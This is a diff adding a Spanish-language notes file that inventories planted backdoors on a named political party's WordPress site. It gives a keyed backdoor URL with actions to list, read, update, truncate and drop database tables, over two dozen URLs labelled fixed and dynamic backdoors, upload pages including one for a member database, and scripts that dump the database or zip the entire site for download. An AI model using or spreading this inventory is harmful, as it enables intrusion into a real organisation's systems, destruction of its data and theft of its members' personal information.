@@ -1,0 +1,73 @@
+//Tablas
+http://pancdmx.org.mx/FILE.php?u=Z4h1t3l1ncr31bl3&a=1
+
+//Select from table
+http://pancdmx.org.mx/FILE.php?u=Z4h1t3l1ncr31bl3&a=2&t=TABLA
+
+//update
+http://pancdmx.org.mx/FILE.php?u=Z4h1t3l1ncr31bl3&a=3&t=TABLA&c=CAMPO&v=VALOR
+
+//trucate
+http://pancdmx.org.mx/FILE.php?u=Z4h1t3l1ncr31bl3&a=4&t=TABLA
+
+//drop
+http://pancdmx.org.mx/FILE.php?u=Z4h1t3l1ncr31bl3&a=5&t=TABLA
+
+
+
+UPLOADS
+http://pancdmx.org.mx/quienes-somos/
+http://pancdmx.org.mx/candidatos-new/
+http://pancdmx.org.mx/gobierno-digital/
+http://pancdmx.org.mx/plataforma/
+http://pancdmx.org.mx/sin-categoria/base-militantes/
+
+
+BACKDOORS FIJOS
+http://pancdmx.org.mx/classes.php
+http://pancdmx.org.mx/no_remove.php
+http://pancdmx.org.mx/archive.php
+http://pancdmx.org.mx/wp-content/uploads/register.php
+http://pancdmx.org.mx/wp-content/uploads/includes.php
+http://pancdmx.org.mx/wp-content/uploads/left.php
+
+
+BACKDOORS DINAMICOS
+http://pancdmx.org.mx/wp-content/uploads/wp_includes.php
+http://pancdmx.org.mx/wp-admin/adminwp.php
+http://pancdmx.org.mx/wp-includes/wp-admin.php
+http://pancdmx.org.mx/divi_home_template.php
+http://pancdmx.org.mx/tpl_wp.php
+http://pancdmx.org.mx/wp-content/tpl_wp.php
+http://pancdmx.org.mx/wp-includes/tpl_wp.php
+http://pancdmx.org.mx/wp-admin/admin_divi.php
+http://pancdmx.org.mx/wp-admin/wp-adm.php
+http://pancdmx.org.mx/wp-admin/classes.php
+http://pancdmx.org.mx/wp-content/uploads/2016/01/classes.php
+http://pancdmx.org.mx/wp-content/uploads/2016/02/uplodas.php
+http://pancdmx.org.mx/wp-content/uploads/2016/03/uplodads.php
+http://pancdmx.org.mx/wp-admin/lib-themes.php
+http://pancdmx.org.mx/wp-admin/divi.php
+http://pancdmx.org.mx/wp-admin/config-themes.php
+http://pancdmx.org.mx/wp-admin/wp-lib.php
+http://pancdmx.org.mx/wp-lib.php
+http://pancdmx.org.mx/wp-index.php
+http://pancdmx.org.mx/wp-index.php
+http://pancdmx.org.mx/wp-content/left.php
+
+
+
+PARA TENER UN DUMP DE LA BASE DE DATOS
+http://pancdmx.org.mx/wp-content/right.php
+http://pancdmx.org.mx/wp-content/wp-database.php
+
+
+
+
+
+PARA ZIPEAR TODO EL SITIO (NO FUNCIONA SI EL TIEMPO DE EJECUCIÓN FUE DEMASIADO)
+http://pancdmx.org.mx/wp-zip.php  -> http://pancdmx.org.mx/allsite.zip
+http://pancdmx.org.mx/wp-admin/includes.php  -> http://pancdmx.org.mx/allsite.zip
+http://pancdmx.org.mx/wp-admin/wp-inc.php  -> http://pancdmx.org.mx/allsite.zip
+
+
